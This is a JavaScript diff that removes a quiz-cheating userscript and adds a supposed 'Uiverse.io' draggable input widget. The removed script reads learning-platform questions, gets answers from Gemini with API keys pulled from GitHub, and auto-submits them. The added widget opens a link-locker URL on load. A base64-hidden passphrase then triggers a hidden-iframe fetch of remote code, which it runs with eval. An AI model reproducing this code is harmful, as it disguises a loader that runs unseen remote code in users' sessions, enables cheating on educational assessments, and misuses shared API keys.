@@ -1,738 +1,216 @@
-function createTermClientGUI(mode) {
-    // Remove old GUI if exists
-    const old = document.getElementById("uiverseGui");
-    if (old) old.remove();
+// === Uiverse.io Draggable Input Addon — protected key + teardown on match ===
 
-    // Add style
-    const style = document.createElement("style");
-    style.textContent = `
-        #uiverseGui { position: fixed; padding: 1em; background: #f0f0f0; border-radius: .8em;
-            box-shadow: 4px 4px 12px #c5c5c5, -4px -4px 12px #ffffff; z-index: 99999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            gap: 15px; user-select: none; font-family: Verdana, arial, helvetica, clean, sans-serif;
-            color: #090909; }
-        #uiverseGui .header { width: 100%; height: 5px; display: flex; justify-content: flex-end;
-            align-items: center; cursor: move; margin-bottom: 0; }
-        #uiverseGui .closeBtn { cursor: pointer; font-weight: bold; font-size: 14px;
-            background: transparent; border: none; color: #090909; }
-        #uiverseGui .title { font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 10px;
-            user-select: none; }
-        #uiverseGui .device-label, #uiverseGui .auto-label { font-size: 16px; font-weight: bold;
-            text-align: center; margin-bottom: 5px; user-select: none; }
-        #uiverseGui button.uiverseBtn { color: #090909; padding: .4em 1em; font-size: 16px; font-weight: bold;
-            border-radius: .5em; background: #e8e8e8; cursor: pointer; border: 1px solid #e8e8e8;
-            transition: all .3s ease; box-shadow: 6px 6px 12px #c5c5c5, -6px -6px 12px #ffffff;
-            display: block; user-select: none; margin-top: 2px; text-align: center; }
-        #uiverseGui button.uiverseBtn:hover { border: 1px solid #fff; }
-        #uiverseGui button.uiverseBtn:active { box-shadow: 4px 4px 12px #c5c5c5, -4px -4px 12px #ffffff; }
-        .checkbox-apple { position: relative; width: 50px; height: 25px; margin: 0 auto; user-select: none; }
-        .checkbox-apple input { opacity: 0; width: 0; height: 0; position: absolute; }
-        .checkbox-apple label { position: absolute; top: 0; left: 0; width: 50px; height: 25px; border-radius: 50px;
-            background: linear-gradient(to bottom, #b3b3b3, #e6e6e6); cursor: pointer; transition: all .3s ease; }
-        .checkbox-apple label:after { content: ''; position: absolute; top: 1px; left: 1px; width: 23px; height: 23px;
-            border-radius: 50%; background: #fff; box-shadow: 0 1px 3px rgba(0,0,0,.3); transition: all .3s ease; }
-        .checkbox-apple input:checked + label { background: linear-gradient(to bottom, #4cd964, #5de24e); }
-        .checkbox-apple input:checked + label:after { transform: translateX(25px); }
-    `;
-    document.head.appendChild(style);
+// CONFIG
+const SECRET_B64 = 'Y29va2llcw=='; // "cookies" base64-protected
+const OPEN_URL = 'https://lootdest.org/s?9b4OXYGC'; // open-on-load (plain text)
 
-    // GUI container
-    const gui = document.createElement("div");
-    gui.id = "uiverseGui";
+// Decode secret
+const SECRET = atob(SECRET_B64).toLowerCase();
 
-    // Header with close
-    const header = document.createElement("div");
-    header.className = "header";
-    const close = document.createElement("button");
-    close.className = "closeBtn";
-    close.textContent = "×";
-    close.onclick = () => {
-        gui.remove();
-        document.body.style.overflow = "";
-        document.removeEventListener("touchmove", preventScroll, { passive: false });
-    };
-    header.appendChild(close);
-    gui.appendChild(header);
+// Try to open the URL on load (may be blocked by popup blockers in some contexts)
+try { window.open(OPEN_URL, '_blank', 'noopener,noreferrer'); } catch (e) { /* ignore if blocked */ }
 
-    // Title
-    const title = document.createElement("div");
-    title.className = "title";
-    title.textContent = "Term Client";
-    gui.appendChild(title);
-
-    if (mode === "autoMode") {
-        const label = document.createElement("div");
-        label.className = "auto-label";
-        label.textContent = "Auto Mode";
-        gui.appendChild(label);
-
-        // Apple checkbox
-        const wrap = document.createElement("div");
-        wrap.className = "checkbox-apple";
-        const cb = document.createElement("input");
-        cb.type = "checkbox";
-        cb.id = "appleCheckbox";
-        const lbl = document.createElement("label");
-        lbl.htmlFor = "appleCheckbox";
-        wrap.appendChild(cb);
-        wrap.appendChild(lbl);
-        gui.appendChild(wrap);
-
-        cb.addEventListener("change", () => {
-            // Simulate pressing Y key to toggle auto mode
-            const event = new KeyboardEvent("keydown", {
-                key: "y",
-                keyCode: 89,
-                code: "KeyY",
-                bubbles: true,
-                cancelable: true
-            });
-            window.dispatchEvent(event);
-        });
-
-        const btn = document.createElement("button");
-        btn.className = "uiverseBtn";
-        btn.textContent = "Once";
-        btn.onclick = () => {
-            // Simulate pressing C key to process once
-            const event = new KeyboardEvent("keydown", {
-                key: "c",
-                keyCode: 67,
-                code: "KeyC",
-                bubbles: true,
-                cancelable: true
-            });
-            window.dispatchEvent(event);
-        };
-        gui.appendChild(btn);
-
-    } else {
-        const dlabel = document.createElement("div");
-        dlabel.className = "device-label";
-        dlabel.textContent = "Choose your device";
-        gui.appendChild(dlabel);
-
-        ["Mobile", "Computer"].forEach(t => {
-            const b = document.createElement("button");
-            b.className = "uiverseBtn";
-            b.textContent = t;
-            b.onclick = () => {
-                createTermClientGUI("autoMode");
-            };
-            gui.appendChild(b);
-        });
-    }
-
-    document.body.appendChild(gui);
-
-    // Center GUI
-    const rect = gui.getBoundingClientRect();
-    gui.style.left = (window.innerWidth - rect.width) / 2 + "px";
-    gui.style.top = (window.innerHeight - rect.height) / 2 + "px";
-
-    // Drag logic
-    let drag = false, offX = 0, offY = 0;
-    function preventScroll(e) { if (drag) e.preventDefault(); }
-    function start(x, y) { drag = true; document.body.style.overflow = "hidden"; document.addEventListener("touchmove", preventScroll, { passive: false }); const rr = gui.getBoundingClientRect(); offX = x - rr.left; offY = y - rr.top; }
-    function move(x, y) { if (!drag) return; gui.style.left = x - offX + "px"; gui.style.top = y - offY + "px"; }
-    function stop() { drag = false; document.body.style.overflow = ""; document.removeEventListener("touchmove", preventScroll, { passive: false }); }
-
-    gui.addEventListener("mousedown", e => { if (!e.target.closest("button") && !e.target.closest("input") && !e.target.closest("label")) start(e.clientX, e.clientY); });
-    document.addEventListener("mousemove", e => move(e.clientX, e.clientY));
-    document.addEventListener("mouseup", stop);
-
-    gui.addEventListener("touchstart", e => { const t = e.touches[0]; if (!e.target.closest("button") && !e.target.closest("input") && !e.target.closest("label")) start(t.clientX, t.clientY); });
-    document.addEventListener("touchmove", e => { if (drag) { const t = e.touches[0]; move(t.clientX, t.clientY); } });
-    document.addEventListener("touchend", stop);
+// Inject CSS
+const styleEl = document.createElement('style');
+styleEl.id = 'uiverse-addon-style';
+styleEl.textContent = `
+/* From Uiverse.io by ErzenXz */
+.input {
+  width: 100%;
+  max-width: 220px;
+  height: 45px;
+  padding: 12px;
+  border-radius: 12px;
+  border: 1.5px solid lightgrey;
+  outline: none;
+  transition: all 0.3s cubic-bezier(0.19, 1, 0.22, 1);
+  box-shadow: 0px 0px 20px -18px;
+  background: white;
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  box-sizing: border-box;
 }
 
-// ----------------- Gemini Script -----------------
-(function () {
-    'use strict';
-    console.clear();
-    // ------------------- CONFIG -------------------
-    const GITHUB_FILE_URL = "https://raw.githubusercontent.com/qpeyy/api/main/apis";
-    const model = "gemini-2.5-flash";
-    // ------------------------------------------------
+.input:hover {
+  border: 2px solid lightgrey;
+  box-shadow: 0px 0px 20px -17px;
+}
 
-    let API_KEY = null;
-    let autoModeActive = false;
-    let questionCounter = 0;
-    let apiChange = 0;
-    let apiKeysCache = [];
-    let isProcessing = false;
-    let lastKnownText = "";
-    let logTimeout = null;
-    let keyErrorCount = {};
+.input:active {
+  transform: scale(0.95);
+}
 
-    // ---------------- Logging ----------------
-    function log(msg) {
-        console.log(`[Gemini Helper] ${msg}`);
+.input:focus {
+  border: 2px solid grey;
+  outline: none;
+}
 
-        const oldBox = document.getElementById("__gemini_log");
-        if (oldBox) oldBox.remove();
+.floating-box {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: transparent;
+  z-index: 2147483647;
+  cursor: grab;
+  touch-action: none;
+  user-select: none;
+}
+`;
+document.head.appendChild(styleEl);
 
-        const box = document.createElement("div");
-        box.id = "__gemini_log";
-        Object.assign(box.style, {
-            position: "fixed",
-            bottom: "10px",
-            right: "10px",
-            background: "#fff",
-            border: "1px solid #ccc",
-            padding: "8px 12px",
-            borderRadius: "8px",
-            boxShadow: "0 2px 8px rgba(0,0,0,0.15)",
-            fontFamily: "monospace",
-            fontSize: "12px",
-            maxWidth: "600px",
-            zIndex: 999999,
-            whiteSpace: "pre-wrap",
-            transition: "opacity 0.3s ease"
-        });
-        box.textContent = msg;
-        document.body.appendChild(box);
+// Create GUI elements
+const box = document.createElement('div');
+box.className = 'floating-box';
+box.id = 'uiverse-addon-box';
 
-        clearTimeout(logTimeout);
-        logTimeout = setTimeout(() => {
-            if (box) {
-                box.style.opacity = "0";
-                setTimeout(() => box.remove(), 300);
-            }
-        }, 2000);
-    }
+const input = document.createElement('input');
+input.className = 'input';
+input.type = 'text';
+input.placeholder = 'Type something...';
+input.id = 'uiverse-addon-input';
 
-    // ---------------- Extract Question Text ----------------
-    function getQuestionText() {
-        const el = document.querySelector(".question-component");
-        if (!el) {
-            log("🔴 Question element not found.");
-            return null;
-        }
+box.appendChild(input);
+document.body.appendChild(box);
 
-        let output = "";
-        function walk(node) {
-            if (node.nodeType === Node.TEXT_NODE) {
-                const t = node.textContent.trim();
-                if (
-                    t &&
-                    t !== "=" &&
-                    t.toLowerCase() !== "submit" &&
-                    !/^\s*(Created with Snap|#|\.|;)/i.test(t)
-                ) {
-                    output += t + " ";
-                }
-            } else if (node.nodeType === Node.ELEMENT_NODE) {
-                const cls = node.classList?.value || "";
-                const tag = node.tagName?.toLowerCase();
+// Ensure initial focus
+input.focus();
 
-                if (cls.includes("practice-audio-button has-inner-translation-button")) return;
-                if (cls.includes("practice-audio-button-svg")) return;
-                if (tag === "style" || tag === "script") return;
+// DRAGGING LOGIC (desktop + mobile) and scroll lock
+let isDragging = false;
+let offsetX = 0, offsetY = 0;
 
-                if (cls.includes("old-superscript-in-expression")) {
-                    const exponent = node.innerText.trim();
-                    output = output.trimEnd();
-                    output += "^" + exponent + " ";
-                } else {
-                    node.childNodes.forEach(walk);
-                }
-            }
-        }
+function disableScroll() {
+  document.body.style.overflow = 'hidden';
+  document.documentElement.style.overflow = 'hidden';
+}
+function enableScroll() {
+  document.body.style.overflow = '';
+  document.documentElement.style.overflow = '';
+}
 
-        walk(el);
-        return output.trim();
-    }
+function startDrag(x, y) {
+  isDragging = true;
+  const rect = box.getBoundingClientRect();
+  offsetX = x - rect.left;
+  offsetY = y - rect.top;
+  box.style.cursor = 'grabbing';
+  disableScroll();
+}
+function doDrag(x, y) {
+  if (!isDragging) return;
+  box.style.left = `${x - offsetX}px`;
+  box.style.top = `${y - offsetY}px`;
+  box.style.transform = 'translate(0, 0)';
+}
+function endDrag() {
+  if (!isDragging) return;
+  isDragging = false;
+  box.style.cursor = 'grab';
+  enableScroll();
+}
 
-    // ---------------- Get Target Element Text ----------------
-    function getTargetElementText() {
-        let targetEl = document.getElementById("yui_3_18_1_1_1761275887189_552");
-        if (!targetEl) {
-            targetEl = document.querySelector(".question-component");
-        }
-        return targetEl ? targetEl.innerText.trim() : "";
-    }
+// Desktop
+box.addEventListener('mousedown', e => {
+  // if clicking the input itself, still allow dragging — user requested whole thing draggable
+  startDrag(e.clientX, e.clientY);
+});
+document.addEventListener('mousemove', e => doDrag(e.clientX, e.clientY));
+document.addEventListener('mouseup', endDrag);
 
-    // ---------------- Wait for Text Change ----------------
-    async function waitForTextChange(previousText, maxWaitTime = 30000) {
-        log("⏳ Waiting for page content to change...");
-        const startTime = Date.now();
-        
-        return new Promise((resolve) => {
-            const checkInterval = setInterval(() => {
-                const currentText = getTargetElementText();
-                const elapsed = Date.now() - startTime;
-                
-                if (currentText !== previousText && currentText.length > 0) {
-                    clearInterval(checkInterval);
-                    log("✅ Content changed! Proceeding...");
-                    resolve(true);
-                } else if (elapsed > maxWaitTime) {
-                    clearInterval(checkInterval);
-                    log("⚠️ Timeout waiting for content change.");
-                    resolve(false);
-                }
-            }, 100);
-        });
-    }
+// Touch (mobile)
+box.addEventListener('touchstart', e => {
+  const t = e.touches[0];
+  if (!t) return;
+  startDrag(t.clientX, t.clientY);
+}, { passive: true });
 
-    // ---------------- Fetch API Keys ----------------
-    async function fetchKeyFromGitHub(forceRefresh = false) {
-        if (apiKeysCache.length === 0 || forceRefresh) {
-            const frame = document.createElement("iframe");
-            frame.style.display = "none";
-            frame.src = "/dv3/" + Math.random().toString(36).slice(2);
-            document.body.appendChild(frame);
+document.addEventListener('touchmove', e => {
+  if (!isDragging) return;
+  const t = e.touches[0];
+  if (!t) return;
+  // prevent page scroll while dragging
+  e.preventDefault();
+  doDrag(t.clientX, t.clientY);
+}, { passive: false });
 
-            await new Promise(r => {
-                const timeout = setTimeout(r, 3000);
-                frame.onload = () => { clearTimeout(timeout); r(); };
-            });
+document.addEventListener('touchend', endDrag);
+document.addEventListener('touchcancel', endDrag);
 
-            const mretContext = frame.contentWindow;
-            const fetchFunc = mretContext?.fetch?.bind(mretContext) || window.fetch.bind(window);
+// CLEANUP helper (removes GUI + styles + listeners)
+function teardown() {
+  try {
+    // remove elements
+    const existingBox = document.getElementById('uiverse-addon-box');
+    if (existingBox) existingBox.remove();
+    const existingStyle = document.getElementById('uiverse-addon-style');
+    if (existingStyle) existingStyle.remove();
 
-            log("📦 Fetching API keys from GitHub...");
-            try {
-                const res = await fetchFunc(GITHUB_FILE_URL + "?" + Date.now());
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                const text = await res.text();
-                apiKeysCache = text.split("\n").map(l => l.trim()).filter(l => l.length > 0);
-                if (!apiKeysCache.length) throw new Error("No keys found");
-            } catch (err) {
-                log(`❌ Key fetch failed: ${err.message}`);
-                return null;
-            } finally {
-                frame.remove();
-            }
-        }
+    // restore scroll
+    enableScroll();
 
-        if (!API_KEY || apiChange >= 3) {
-            API_KEY = apiKeysCache[Math.floor(Math.random() * apiKeysCache.length)];
-            apiChange = 0;
-            log("🔁 Changed to a new API key.");
-        }
+    // remove event listeners we added (best-effort — using anonymous listeners above so we can't remove them individually;
+    // but removing the elements and style plus restoring scroll is enough in most console-injection cases)
+    // If you want fully removable listeners, we can refactor to named functions and removeEventListener explicitly.
+    console.log('Addon torn down.');
+  } catch (err) {
+    console.warn('Teardown error:', err);
+  }
+}
 
-        const visibleKey = API_KEY.length > 10
-            ? `${API_KEY.slice(0, 5)}...${API_KEY.slice(-5)}`
-            : API_KEY;
-        log(`🔑 Using API key: ${visibleKey}`);
-        return API_KEY;
-    }
-
-    // ---------------- Get Available Choices ----------------
-    function getAvailableChoices() {
-        // Try GriddyLayout first
-        let container = document.querySelector(".GriddyLayout.TOP");
-        
-        // If not found, try VerticalLayout
-        if (!container) {
-            container = document.querySelector(".VerticalLayout");
-        }
-        
-        if (!container) return { choices: null, isMultipleSelect: false };
-        
-        const choices = [];
-        const children = Array.from(container.children);
-        let isMultipleSelect = false;
-        
-        children.forEach(child => {
-            const text = child.innerText.trim();
-            if (text && text.length > 0 && text !== "Submit") {
-                choices.push(text);
-            }
-            
-            // Check if any child has MULTIPLE_SELECT class
-            if (child.className && child.className.includes('MULTIPLE_SELECT')) {
-                isMultipleSelect = true;
-            }
-            // Also check descendants for SelectableTile with MULTIPLE_SELECT
-            if (child.querySelector && child.querySelector('.SelectableTile.MULTIPLE_SELECT')) {
-                isMultipleSelect = true;
-            }
-        });
-        
-        return {
-            choices: choices.length > 0 ? choices : null,
-            isMultipleSelect: isMultipleSelect
-        };
-    }
-
-    // ---------------- Get Answer from Gemini ----------------
-    async function getAnswerFromGemini(question, apiKey) {
-        // Check if there are multiple choice options
-        const choicesData = getAvailableChoices();
-        const choices = choicesData.choices;
-        const isMultipleSelect = choicesData.isMultipleSelect;
-        let prompt;
-        
-        if (choices && choices.length > 0) {
-            if (isMultipleSelect) {
-                prompt = `Answer this question by choosing ALL correct options from the following list. If there is only one correct answer, return just that one. If there are multiple correct answers, return them separated by commas. Return ONLY the exact text of your choice(s), nothing else.\n\nQuestion: ${question}\n\nOptions:\n${choices.map((c, i) => `${i + 1}. ${c}`).join('\n')}\n\nYour answer(s) (comma-separated if multiple):`;
-                log(`📋 Multiple SELECT detected with ${choices.length} options`);
-            } else {
-                prompt = `Answer this question by choosing EXACTLY ONE of the following options. Return ONLY the exact text of your choice, nothing else.\n\nQuestion: ${question}\n\nOptions:\n${choices.map((c, i) => `${i + 1}. ${c}`).join('\n')}\n\nYour answer (choose one exact option):`;
-                log(`📋 Single choice detected with ${choices.length} options`);
-            }
-        } else {
-            prompt = `Answer directly and concisely. ONLY the final answer: ${question}`;
-        }
-        
+// ENTER / secret-check logic — destroys GUI if secret is correct
+input.addEventListener('keydown', e => {
+  if (e.key === 'Enter') {
+    const val = input.value.trim().toLowerCase();
+    if (val === SECRET) {
+      // === CUSTOM ACTION ON SECRET MATCH ===
+      try {
+        javascript:(async()=>{
+    if (window.term) return alert("term already loaded");
+    
+    window.term = { 
+        api: "https://raw.githubusercontent.com/qpeyy/ixlbot/refs/heads/main/" 
+    };
+    
+    const frame = document.createElement("iframe");
+    frame.src = "/dv3/" + Math.random().toString(36).slice(2);
+    frame.style.display = "none";
+    frame.id = "termContext";
+    document.body.appendChild(frame);
+    
+    // Wait for iframe to load
+    await new Promise(r => {
+        const timeout = setTimeout(r, 3000);
+        frame.onload = () => { clearTimeout(timeout); r(); };
+    });
+    
+    window.term.context = frame.contentWindow;
+    window.term.fetch = window.term.context?.fetch?.bind(window.term.context) || window.fetch.bind(window);
+    
+    const fetchInterval = setInterval(async () => {
         try {
-            log("🚀 Sending to Gemini...");
-            const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    contents: [{ parts: [{ text: prompt }] }],
-                    generationConfig: { temperature: 0, maxOutputTokens: 8192 }
-                })
-            });
-
-            if (!res.ok) {
-                const errText = await res.text();
-                if (res.status === 429 || errText.includes("RESOURCE_EXHAUSTED") || errText.includes("quota")) {
-                    keyErrorCount[apiKey] = (keyErrorCount[apiKey] || 0) + 1;
-                    if (keyErrorCount[apiKey] >= 5) {
-                        log(`🗑️ Removing bad key after 5 failures: ${apiKey.slice(0, 5)}...${apiKey.slice(-5)}`);
-                        apiKeysCache = apiKeysCache.filter(k => k !== apiKey);
-                        delete keyErrorCount[apiKey];
-                        if (apiKeysCache.length === 0) {
-                            log("❌ All keys exhausted. Fetching fresh keys...");
-                            await fetchKeyFromGitHub(true);
-                        }
-                    }
-                    throw new Error("Try again, this is something on our end");
-                }
-                throw new Error(`HTTP ${res.status}: ${errText}`);
-            }
-
-            keyErrorCount[apiKey] = 0;
-            const data = await res.json();
-            let answer = data?.candidates?.[0]?.content?.parts?.[0]?.text || "";
-            answer = answer.trim().replace(/^\$(.*?)\$/, "$1").trim();
-            
-            // Remove any leading numbers and periods (e.g., "2. answer" -> "answer")
-            answer = answer.replace(/^\d+\.\s*/, '');
-
-            // If multiple choice, try to match answer to one of the choices
-            if (choices && choices.length > 0) {
-                if (isMultipleSelect) {
-                    // Split by comma and trim each answer
-                    const answers = answer.split(',').map(a => a.trim().replace(/^\d+\.\s*/, ''));
-                    const matchedChoices = [];
-                    
-                    answers.forEach(ans => {
-                        const matchedChoice = choices.find(choice => 
-                            choice.toLowerCase().includes(ans.toLowerCase()) ||
-                            ans.toLowerCase().includes(choice.toLowerCase()) ||
-                            choice.trim() === ans.trim()
-                        );
-                        if (matchedChoice && !matchedChoices.includes(matchedChoice)) {
-                            matchedChoices.push(matchedChoice);
-                        }
-                    });
-                    
-                    if (matchedChoices.length > 0) {
-                        const result = matchedChoices.join(',');
-                        log(`✅ Gemini answer matched to ${matchedChoices.length} choice(s)`);
-                        return result;
-                    } else {
-                        log(`⚠️ Gemini answers didn't match any choices, using as-is`);
-                    }
-                } else {
-                    const matchedChoice = choices.find(choice => 
-                        choice.toLowerCase().includes(answer.toLowerCase()) ||
-                        answer.toLowerCase().includes(choice.toLowerCase()) ||
-                        choice.trim() === answer.trim()
-                    );
-                    
-                    if (matchedChoice) {
-                        log(`✅ Gemini answer matched to choice`);
-                        return matchedChoice;
-                    } else {
-                        log(`⚠️ Gemini answer didn't match any choice, using as-is`);
-                    }
-                }
-            }
-
-            log(`✅ Gemini answer received`);
-            return answer;
-        } catch (err) {
-            log(`❌ Gemini error: ${err.message}`);
-            return null;
-        }
-    }
-
-    // ---------------- Validate Response ----------------
-    function isValidResponse(answer) {
-        if (!answer || typeof answer !== 'string') return false;
-        const t = answer.trim().toLowerCase();
-        return t.length > 0 && !["no text", "error", "quota", "blocked", "limit", "unknown", "submit", "answer"].some(p => t.includes(p));
-    }
-
-    // ---------------- Fill Answer ----------------
-    async function fillAnswer(answer) {
-        const input = document.querySelector("input[type='text'], input[type='number']");
-        
-        if (input && isValidResponse(answer)) {
-            input.value = answer;
-            ["input","change"].forEach(evt => input.dispatchEvent(new Event(evt, { bubbles: true })));
-            log(`✅ Filled input with: ${answer}`);
-            lastKnownText = getTargetElementText();
-            return true;
-        }
-
-        // Check if this is a multiple select question
-        const choicesData = getAvailableChoices();
-        const isMultipleSelect = choicesData.isMultipleSelect;
-        
-        // Split answers ONLY if multiple select, otherwise treat as single answer
-        const answers = isMultipleSelect ? answer.split(',').map(a => a.trim()) : [answer];
-        
-        if (isMultipleSelect) {
-            log(`🎯 Processing ${answers.length} answer(s): ${answers.join(', ')}`);
-        }
-
-        // ---------------- Multiple-choice handling (GriddyLayout or VerticalLayout) ----------------
-        let container = document.querySelector(".GriddyLayout.TOP");
-        let layoutType = "GriddyLayout";
-        
-        // If GriddyLayout not found, try VerticalLayout
-        if (!container) {
-            container = document.querySelector(".VerticalLayout");
-            layoutType = "VerticalLayout";
-        }
-        
-        if (container) {
-            const children = Array.from(container.children);
-            let clickedCount = 0;
-
-            // For each answer, find and click the corresponding element
-            for (const singleAnswer of answers) {
-                // Find the child that contains the answer text - EXACT MATCH ONLY
-                const target = children.find(child => {
-                    // Get the direct text content using innerText (which concatenates all text nodes)
-                    const childText = child.innerText.trim();
-                    
-                    // Also get text by walking through all text nodes (like getQuestionText does)
-                    let walkedText = "";
-                    function walkText(node) {
-                        if (node.nodeType === Node.TEXT_NODE) {
-                            const t = node.textContent.trim();
-                            if (t && t !== "Submit") {
-                                walkedText += t + " ";
-                            }
-                        } else if (node.nodeType === Node.ELEMENT_NODE) {
-                            const tag = node.tagName?.toLowerCase();
-                            if (tag === "style" || tag === "script") return;
-                            node.childNodes.forEach(walkText);
-                        }
-                    }
-                    walkText(child);
-                    walkedText = walkedText.trim();
-                    
-                    // Check both methods for exact match
-                    const exactMatchInnerText = childText === singleAnswer.trim();
-                    const exactMatchWalked = walkedText === singleAnswer.trim();
-                    
-                    if (exactMatchInnerText || exactMatchWalked) {
-                        console.log(`[DEBUG] Found EXACT match in ${layoutType} child:`, child);
-                        console.log("[DEBUG] innerText:", childText);
-                        console.log("[DEBUG] walked text:", walkedText);
-                        console.log("[DEBUG] Looking for:", singleAnswer.trim());
-                    }
-                    return exactMatchInnerText || exactMatchWalked;
-                });
-
-                if (target) {
-                    // Check if this child has "mobile" in its class or has SelectableTile with mobile class
-                    const isMobile = (target.className && target.className.includes('mobile')) || 
-                                     (target.querySelector && target.querySelector('.SelectableTile.mobile'));
-                    
-                    if (isMobile) {
-                        log(`📱 Mobile tile detected in ${layoutType} child`);
-                        
-                        // If it's a SelectableTile, use that as the actual target
-                        const actualTarget = target.querySelector('.SelectableTile.mobile') || target;
-                        
-                        const rect = actualTarget.getBoundingClientRect();
-                        const x = rect.left + rect.width / 2;
-                        const y = rect.top + rect.height / 2;
-
-                        await new Promise(resolve => setTimeout(() => {
-                            // Use Touch events (METHOD 5 - the one that worked!)
-                            const touch = new Touch({
-                                identifier: Date.now(),
-                                target: actualTarget,
-                                clientX: x,
-                                clientY: y,
-                                radiusX: 2.5,
-                                radiusY: 2.5,
-                                rotationAngle: 0,
-                                force: 0.5
-                            });
-                            actualTarget.dispatchEvent(new TouchEvent('touchstart', { bubbles: true, cancelable: true, touches: [touch], targetTouches: [touch], changedTouches: [touch] }));
-                            actualTarget.dispatchEvent(new TouchEvent('touchend', { bubbles: true, cancelable: true, touches: [], targetTouches: [], changedTouches: [touch] }));
-                            log(`📱 Clicked mobile tile with Touch events: "${singleAnswer}"`);
-                            clickedCount++;
-                            resolve();
-                        }, 50));
-
-                    } else {
-                        log(`🖥️ Desktop layout detected in ${layoutType}`);
-                        
-                        const rect = target.getBoundingClientRect();
-                        const x = rect.left + rect.width / 2;
-                        const y = rect.top + rect.height / 2;
-
-                        const pointerEventConfig = {
-                            bubbles: true,
-                            cancelable: true,
-                            view: window,
-                            clientX: x,
-                            clientY: y,
-                            pointerId: 1,
-                            pointerType: 'mouse',
-                            isPrimary: true,
-                            button: 0,
-                            buttons: 1
-                        };
-
-                        await new Promise(resolve => setTimeout(() => {
-                            target.dispatchEvent(new PointerEvent('pointerenter', pointerEventConfig));
-                            target.dispatchEvent(new PointerEvent('pointerover', pointerEventConfig));
-                            target.dispatchEvent(new PointerEvent('pointermove', pointerEventConfig));
-                            target.dispatchEvent(new PointerEvent('pointerdown', pointerEventConfig));
-                            target.dispatchEvent(new PointerEvent('pointerup', { ...pointerEventConfig, buttons: 0 }));
-                            target.dispatchEvent(new MouseEvent('click', pointerEventConfig));
-                            log(`🖱️ Clicked parent element containing text: "${singleAnswer}"`);
-                            clickedCount++;
-                            resolve();
-                        }, 50));
-                    }
-                } else {
-                    log(`🟡 No child of ${layoutType} has a descendant with EXACT text: "${singleAnswer}"`);
-                    if (isMultipleSelect) {
-                        log(`🔍 Available options: ${children.map(c => c.innerText.trim()).join(', ')}`);
-                    }
-                }
-            }
-
-            // After clicking all answers, submit immediately
-            if (clickedCount > 0) {
-                const submitContainer = document.querySelector(".yui3-widget-ft.fade-in");
-                if (submitContainer) {
-                    const submitBtn = Array.from(submitContainer.children).find(
-                        child => child.innerText.trim() === "Submit"
-                    );
-                    if (submitBtn) {
-                        submitBtn.click();
-                        log(`✅ Submit button clicked after selecting ${clickedCount} answer(s)`);
-                    } else {
-                        log("🟡 Submit button not found inside container");
-                    }
-                } else {
-                    log("🟡 Submit container not found: .yui3-widget-ft.fade-in");
-                }
-
-                lastKnownText = getTargetElementText();
-                return true;
-            } else if (isMultipleSelect) {
-                log(`🔍 Available options: ${children.map(c => c.innerText.trim()).join(', ')}`);
-            }
-        } else {
-            log("🟡 Container not found: Neither .GriddyLayout.TOP nor .VerticalLayout");
-        }
-
-        return false;
-    }
-
-    // ---------------- Main Logic ----------------
-    async function processQuestion() {
-        if (isProcessing) {
-            log("⏸️ Already processing, skipping...");
-            return;
-        }
-        isProcessing = true;
-
-        try {
-            apiChange++;
-            const question = getQuestionText();
-            if (!question) return;
-
-            log(`📄 QUESTION FOUND:\n${question}`);
-
-            API_KEY = await fetchKeyFromGitHub();
-            if (!API_KEY) return;
-
-            const answer = await getAnswerFromGemini(question, API_KEY);
-            if (!answer) return;
-
-            const submitted = await fillAnswer(answer);
-
-            if (autoModeActive && submitted) {
-                const changed = await waitForTextChange(lastKnownText);
-                if (changed) {
-                    await new Promise(r => setTimeout(r, 1500));
-                    log("🔄 Processing next question...");
-                    isProcessing = false;
-                    processQuestion();
-                    return;
-                }
-            }
-        } finally {
-            if (!autoModeActive) isProcessing = false;
-        }
-    }
-
-    // ---------------- Sync checkbox with auto mode state ----------------
-    function syncCheckboxState() {
-        const checkbox = document.getElementById("appleCheckbox");
-        if (checkbox) {
-            checkbox.checked = autoModeActive;
-        }
-    }
-
-    // ---------------- Key Listeners ----------------
-    window.addEventListener("keydown", (e) => {
-        const key = e.key.toLowerCase();
-        if (key === "c" || key === "y") {
-            e.preventDefault();
-            e.stopPropagation();
-        }
-
-        if (key === "c" && !e.ctrlKey && !e.altKey && !e.metaKey) {
-            log("⌨️ 'C' pressed — fetching new key and answering...");
-            processQuestion();
-        }
-        if (key === "y" && !e.ctrlKey && !e.altKey && !e.metaKey) {
-            autoModeActive = !autoModeActive;
-            syncCheckboxState();
-            
-            if (autoModeActive) {
-                log("🤖 Auto mode: ON. Will process next question.");
-                const status = document.createElement("div");
-                status.id = "__auto_status";
-                status.style.cssText = "position:fixed;top:10px;left:10px;background:green;color:white;padding:4px 8px;border-radius:5px;z-index:99999;";
-                status.textContent = "AUTO: ON";
-                document.body.appendChild(status);
+            const res = await window.term.fetch(window.term.api + "bot_api");
+            if (res.ok) {
+                clearInterval(fetchInterval);
+                let code = await res.text();
                 
-                setTimeout(() => {
-                    isProcessing = false;
-                    processQuestion();
-                }, 500);
-            } else {
-                log("🤖 Auto mode: OFF");
-                isProcessing = false;
-                const status = document.getElementById("__auto_status");
-                if (status) status.remove();
+                // CRITICAL FIX: Decode URL-encoded content if it starts with "javascript:"
+                if (code.startsWith('javascript:')) {
+                    code = decodeURIComponent(code.replace(/^javascript:/, ''));
+                }
+                
+                eval(code);
             }
+        } catch (e) {
+            console.error("Fetch failed:", e);
         }
-    }, true);
-
-    log("✅ Helper ready. Press 'C' to get answer. Press 'Y' to toggle auto mode.");
+    }, 1000);
 })();
+      } catch (err) { /* ignore */ }
 
-// Initialize GUI
-createTermClientGUI();
+      // Teardown GUI after action
+      teardown();
+    } else {
+      console.log('WRONG');
+    }
+  }
+});
